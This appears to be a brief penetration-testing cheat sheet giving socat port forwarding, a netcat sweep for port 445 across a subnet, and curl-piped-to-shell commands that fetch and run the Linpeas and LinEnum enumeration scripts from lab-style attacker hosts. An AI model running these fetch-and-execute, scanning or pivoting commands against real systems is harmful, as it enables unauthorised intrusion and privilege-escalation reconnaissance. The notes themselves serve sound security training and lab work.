# Forwarding & Tunneling

**Socat port forward**

```js
socat TCP-LISTEN:4141,fork TCP:<remote IP>:<remote port>
```

Remote port is now accessible at **Local IP** and **Local Port**

# Netcat Port Scan

-----

```js
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

# Linpeas

----

**In memory execution**

```bash
curl 10.10.14.24:80/enum/linpeas.sh | sh | tee /tmp/linpeas.out
```

# LinEnum

----

**In memory execution**

```bash
curl 192.168.49.135:80/enum/lse.sh | sh | tee /tmp/lse.out
```




